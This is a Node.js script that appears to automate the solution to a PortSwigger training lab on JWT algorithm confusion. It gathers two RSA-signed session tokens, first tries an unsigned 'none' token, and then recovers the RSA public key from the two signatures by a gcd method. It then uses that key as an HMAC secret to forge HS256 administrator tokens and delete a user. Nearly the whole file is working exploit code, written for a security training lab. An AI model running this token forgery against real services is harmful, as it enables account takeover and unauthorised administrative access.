const crypto = require('crypto');
const { deleteCarlos, labLogin, runLab } = require('./_common.cjs');

const TITLE = 'JWT authentication bypass via algorithm confusion with no exposed key';
const PATH = '/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key';
const DIGEST_PREFIX = {
  sha256: Buffer.from('3031300d060960864801650304020105000420', 'hex'),
  sha384: Buffer.from('3041300d060960864801650304020205000430', 'hex'),
  sha512: Buffer.from('3051300d060960864801650304020305000440', 'hex'),
};

function b64urlDecode(value) {
  const normalized = value.replace(/-/g, '+').replace(/_/g, '/');
  const padding = normalized.length % 4 === 0 ? '' : '='.repeat(4 - (normalized.length % 4));
  return Buffer.from(normalized + padding, 'base64');
}

function b64urlEncode(value) {
  const buffer = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return buffer.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}

function parseJwt(token) {
  const [encHeader, encPayload, signature = ''] = token.split('.');
  return {
    encHeader,
    encPayload,
    signature,
    header: JSON.parse(b64urlDecode(encHeader).toString('utf8')),
    payload: JSON.parse(b64urlDecode(encPayload).toString('utf8')),
    signatureBytes: b64urlDecode(signature),
  };
}

function stringifyJwt(header, payload, signature = '') {
  const encodedHeader = b64urlEncode(JSON.stringify(header));
  const encodedPayload = b64urlEncode(JSON.stringify(payload));
  return `${encodedHeader}.${encodedPayload}.${signature}`;
}

function bigintFromBuffer(buffer) {
  const hex = buffer.toString('hex') || '00';
  return BigInt('0x' + hex);
}

function bufferFromBigint(value) {
  let hex = value.toString(16);
  if (hex.length % 2) hex = '0' + hex;
  return Buffer.from(hex, 'hex');
}

function gcd(a, b) {
  let x = a < 0n ? -a : a;
  let y = b < 0n ? -b : b;
  while (y !== 0n) {
    const tmp = x % y;
    x = y;
    y = tmp;
  }
  return x;
}

function modPow(base, exponent, modulus) {
  let result = 1n;
  let value = base % modulus;
  let power = exponent;
  while (power > 0n) {
    if (power & 1n) result = (result * value) % modulus;
    power >>= 1n;
    value = (value * value) % modulus;
  }
  return result;
}

function emsaPkcs1V15(hashAlg, message, size) {
  const digest = crypto.createHash(hashAlg).update(message).digest();
  const digestInfo = Buffer.concat([DIGEST_PREFIX[hashAlg], digest]);
  const padLength = size - digestInfo.length - 3;
  if (padLength < 8) throw new Error('Invalid signature size for PKCS#1 padding');
  return Buffer.concat([Buffer.from([0x00, 0x01]), Buffer.alloc(padLength, 0xff), Buffer.from([0x00]), digestInfo]);
}

function hashForAlg(alg) {
  if (alg === 'RS256') return 'sha256';
  if (alg === 'RS384') return 'sha384';
  if (alg === 'RS512') return 'sha512';
  throw new Error(`Unsupported JWT algorithm: ${alg}`);
}

function publicKeyPemCandidates(modulus, exponent) {
  const jwk = {
    kty: 'RSA',
    n: b64urlEncode(bufferFromBigint(modulus)),
    e: b64urlEncode(bufferFromBigint(exponent)),
  };
  const key = crypto.createPublicKey({ key: jwk, format: 'jwk' });
  return [
    key.export({ type: 'spki', format: 'pem' }).toString(),
    key.export({ type: 'pkcs1', format: 'pem' }).toString(),
  ];
}

function derivePublicKeys(token1, token2) {
  const first = parseJwt(token1);
  const second = parseJwt(token2);
  if (!String(first.header.alg || '').startsWith('RS') || !String(second.header.alg || '').startsWith('RS')) {
    throw new Error('Tokens are not RSA-signed');
  }
  const hashAlg = hashForAlg(first.header.alg);
  const m1 = bigintFromBuffer(emsaPkcs1V15(hashAlg, `${first.encHeader}.${first.encPayload}`, first.signatureBytes.length));
  const m2 = bigintFromBuffer(emsaPkcs1V15(hashAlg, `${second.encHeader}.${second.encPayload}`, second.signatureBytes.length));
  const s1 = bigintFromBuffer(first.signatureBytes);
  const s2 = bigintFromBuffer(second.signatureBytes);

  const candidates = [];
  for (const e of [65537n, 3n]) {
    const factor = gcd((s1 ** e) - m1, (s2 ** e) - m2);
    for (let multiplier = 1n; multiplier <= 100n; multiplier += 1n) {
      const n = (factor + multiplier - 1n) / multiplier;
      if (n <= 0n) continue;
      if (modPow(s1, e, n) === m1 && modPow(s2, e, n) === m2) {
        candidates.push(...publicKeyPemCandidates(n, e));
      }
    }
  }
  return [...new Set(candidates)];
}

function signHs256(header, payload, secret) {
  const encodedHeader = b64urlEncode(JSON.stringify(header));
  const encodedPayload = b64urlEncode(JSON.stringify(payload));
  const input = `${encodedHeader}.${encodedPayload}`;
  const signature = crypto.createHmac('sha256', secret).update(input).digest();
  return `${input}.${b64urlEncode(signature)}`;
}

async function setSessionCookie(context, labUrl, value) {
  await context.addCookies([
    {
      name: 'session',
      value,
      domain: new URL(labUrl).hostname,
      path: '/',
      httpOnly: true,
      secure: true,
    },
  ]);
}

async function getSessionCookie(context, labUrl) {
  const cookies = await context.cookies(labUrl);
  const session = cookies.find((cookie) => cookie.name === 'session')?.value;
  if (!session) throw new Error('Session JWT cookie not found');
  return session;
}

function adminPayload(original) {
  const payload = { ...original };
  if ('sub' in payload) payload.sub = 'administrator';
  if ('username' in payload) payload.username = 'administrator';
  if ('user' in payload) payload.user = 'administrator';
  if ('email' in payload && /wiener/i.test(String(payload.email))) payload.email = 'administrator@portswigger.net';
  payload.exp = Math.floor(Date.now() / 1000) + 86400;
  return payload;
}

async function tryAdminToken({ context, page, labUrl, token }) {
  await setSessionCookie(context, labUrl, token);
  await deleteCarlos(page, labUrl);
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ context, page, labUrl, sleep }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const token1 = await getSessionCookie(context, labUrl);
    await page.goto(labUrl + '/logout', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    await sleep(1200);
    await labLogin(page, labUrl, 'wiener', 'peter');
    const token2 = await getSessionCookie(context, labUrl);
    const parsed = parseJwt(token2);

    const noneHeader = { ...parsed.header, alg: 'none' };
    const noneToken = stringifyJwt(noneHeader, adminPayload(parsed.payload), '');
    await tryAdminToken({ context, page, labUrl, token: noneToken });
    if (await require('./_common.cjs').isSolved(page, labUrl)) return;

    const candidateSecrets = derivePublicKeys(token1, token2);
    if (!candidateSecrets.length) {
      throw new Error('No derived public-key candidates found');
    }

    for (const secret of candidateSecrets) {
      const forged = signHs256({ ...parsed.header, alg: 'HS256' }, adminPayload(parsed.payload), secret);
      await tryAdminToken({ context, page, labUrl, token: forged });
      if (await require('./_common.cjs').isSolved(page, labUrl)) return;
    }
    throw new Error('JWT forgery attempts did not solve the lab');
  },
});
